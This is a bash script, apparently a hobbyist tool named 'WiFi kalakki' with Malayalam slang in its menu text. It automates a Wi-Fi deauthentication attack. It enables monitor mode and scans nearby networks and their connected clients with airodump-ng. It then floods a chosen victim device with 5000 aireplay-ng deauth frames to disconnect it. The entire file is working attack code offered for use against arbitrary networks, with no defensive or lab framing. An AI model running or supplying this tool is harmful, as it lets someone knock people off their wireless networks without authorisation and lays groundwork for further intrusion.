#!/bin/bash

# Ensure the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo -e "\n[-] Error: WiFi kalakki must be run with root privileges (sudo ./pattas)"
  exit 1
fi

# Cleanup function to remove temporary scan files on exit
cleanup() {
  rm -f /tmp/pattas_scan* /tmp/pattas_target*
}
trap cleanup EXIT

echo "============================================="
echo "       WiFi kalakki - Hi chellom! (0_0)      "
echo "============================================="

echo "WiFi kalakkiyilott swagatham" 
# 1. Check if wlan0 interface is available
echo "[+] Checking for choonda interface..."
if ! iwconfig wlan0 > /dev/null 2>&1; then
  echo "[-] Error: Choonda not found! Please connect a compatible wireless card."
  exit 1
fi

echo "[+] Choonda kitty."

# 2. Start monitor mode automatically in the background
echo "[+] Choonda kettikondirikkunnu..."
airmon-ng check kill > /dev/null 2>&1
airmon-ng start wlan0 > /dev/null 2>&1

sleep 1

if iwconfig wlan0mon > /dev/null 2>&1; then
  MON_INTERFACE="wlan0mon"
else
  MON_INTERFACE="wlan0"
fi

if ! iwconfig "$MON_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
  echo "[-] Error: Failed to enable monitor mode on $MON_INTERFACE."
  exit 1
fi

echo "[+] Choonda korthu: $MON_INTERFACE"

SEL_BSSID=""
SEL_CHANNEL=""
SEL_ESSID=""
SEL_CLIENT=""

while true; do
  echo -e "\nMAIN MENU:"
  echo "1. WiFi kalakki (latest kudumbasree version 2.0) "
  echo "2. Exit"
  echo "[WiFI kalakki (Beta thozhilurapp version ) soon...]"
  read -p "Choose an option: " CHOICE

  case $CHOICE in
    1)
      echo -e "\n[+] Starting Wi-Fi Scanner..."
      echo "[!] INSTRUCTION: Press Ctrl+C when you see your innathe era to stop scanning!"
      sleep 4

      rm -f /tmp/pattas_scan*

      trap - SIGINT
      airodump-ng --band abg -w /tmp/pattas_scan --output-format csv "$MON_INTERFACE"
      trap cleanup SIGINT

      echo -e "\n[+] Scan stopped. Parsing results..."

      CSV_FILE="/tmp/pattas_scan-01.csv"
      if [ ! -f "$CSV_FILE" ]; then
        echo "[-] Error: No scan data captured."
        continue
      fi

      echo -e "\n--- INNATHE ERAKAL ---"

      # Columns: $1 = BSSID, $4 = channel, $14 = ESSID
      awk -F, '
        BEGIN { count=0 }
        /BSSID/ { next }
        /Station MAC/ { exit }
        length($1) == 17 {
          count++
          print "[" count "] ESSID: " $14 " | BSSID: " $1 " (CH: " $4 ")"
        }
      ' "$CSV_FILE"

      IFS=$'\n' TARGET_BSSIDS=($(awk -F, '/BSSID/ {next} /Station MAC/ {exit} length($1) == 17 {print $1}' "$CSV_FILE"))
      IFS=$'\n' TARGET_CHANNELS=($(awk -F, '/BSSID/ {next} /Station MAC/ {exit} length($1) == 17 {print $4}' "$CSV_FILE"))
      IFS=$'\n' TARGET_ESSIDS=($(awk -F, '/BSSID/ {next} /Station MAC/ {exit} length($1) == 17 {print $14}' "$CSV_FILE"))

      if [ ${#TARGET_BSSIDS[@]} -eq 0 ]; then
        echo "[-] No networks captured in the log. Try scanning for a longer duration."
        continue
      fi

      echo ""
      read -p "Select era number: " NET_NUM

      if ! [[ "$NET_NUM" =~ ^[0-9]+$ ]] || [ "$NET_NUM" -lt 1 ] || [ "$NET_NUM" -gt ${#TARGET_BSSIDS[@]} ]; then
        echo "[-] Invalid network selection configuration."
        continue
      fi

      SEL_BSSID=$(echo "${TARGET_BSSIDS[$((NET_NUM-1))]}" | tr -d '[:space:]')
      SEL_CHANNEL=$(echo "${TARGET_CHANNELS[$((NET_NUM-1))]}" | tr -d '[:space:]')
      SEL_ESSID=$(echo "${TARGET_ESSIDS[$((NET_NUM-1))]}" | sed 's/^ *//;s/ *$//')

      echo -e "\n[+] Target Locked successfully!"
      echo "    ESSID:   $SEL_ESSID"
      echo "    BSSID:   $SEL_BSSID"
      echo "    Channel: $SEL_CHANNEL"

      echo -e "\n[+] Starting concentrated parathooshanam on target to find connected valligal..."
      echo "[!] INSTRUCTION: Press Ctrl+C once you see your valli device!"
      sleep 2

      rm -f /tmp/pattas_target*

      trap - SIGINT
      airodump-ng --bssid "$SEL_BSSID" -c "$SEL_CHANNEL" -w /tmp/pattas_target --output-format csv "$MON_INTERFACE"
      trap cleanup SIGINT

      echo -e "\n[+] Concentrated scan stopped. Parsing connected devices..."

      TARGET_CSV="/tmp/pattas_target-01.csv"
      if [ ! -f "$TARGET_CSV" ]; then
        echo "[-] Error: No target scan data captured."
        continue
      fi

      echo -e "\n--- CONNECTED VALLIGAL ---"

      # Station section columns: $1 = Station MAC, $4 = Power
      awk -F, '
        BEGIN { in_station=0; count=0 }
        /Station MAC/ { in_station=1; next }
        in_station && length($1) == 17 {
          count++
          print "[" count "] Client MAC: " $1 " | Power: " $4
        }
      ' "$TARGET_CSV"

      IFS=$'\n' CLIENT_MACS=($(awk -F, '
        BEGIN { in_station=0 }
        /Station MAC/ { in_station=1; next }
        in_station && length($1) == 17 { print $1 }
      ' "$TARGET_CSV"))

      if [ ${#CLIENT_MACS[@]} -eq 0 ]; then
        echo "[-] No connected vallikal detected. Try scanning again for longer."
        continue
      fi

      echo ""
      read -p "Select valli number: " CLIENT_NUM

      if ! [[ "$CLIENT_NUM" =~ ^[0-9]+$ ]] || [ "$CLIENT_NUM" -lt 1 ] || [ "$CLIENT_NUM" -gt ${#CLIENT_MACS[@]} ]; then
        echo "[-] Invalid client selection."
        continue
      fi

      SEL_CLIENT=$(echo "${CLIENT_MACS[$((CLIENT_NUM-1))]}" | tr -d '[:space:]')

      echo -e "\n[+] Client Locked successfully!"
      echo "    Target ESSID:  $SEL_ESSID"
      echo "    Target BSSID:  $SEL_BSSID"
      echo "    Channel:       $SEL_CHANNEL"
      echo "    Client MAC:    $SEL_CLIENT"
      sleep 2
      
      rm -f /tmp/pattas_deauth*

      trap - SIGINT
      echo -e "\n[+] Ente ettan pani thodanghi makkale...."
      sudo aireplay-ng --deauth 5000 -a "$SEL_BSSID" -c "$SEL_CLIENT" "$MON_INTERFACE"
      trap cleanup SIGINT
    
      
      TARGET_CSV="/tmp/pattas_target-01.csv"
      if [ ! -f "$TARGET_CSV" ]; then
        echo "[-] Error: No target scan data captured."
        airmon-ng stop "$MON_INTERFACE" > /dev/null 2>&1
        continue
      fi

      echo -e "\n[+] Cleaning up monitor mode..."
      airmon-ng stop "$MON_INTERFACE" > /dev/null 2>&1
      echo "[+] Exiting tool. Goodbye!"
      exit 0
      ;;
      2)
      # FIX 3: Added an explicit exit handler for Option 2
      echo "[+] Exiting tool. Bye chellam!"
      exit 0
      ;;

    *)
      echo "[-] Invalid option. Please press 1 or 2."
      ;;
  esac
done
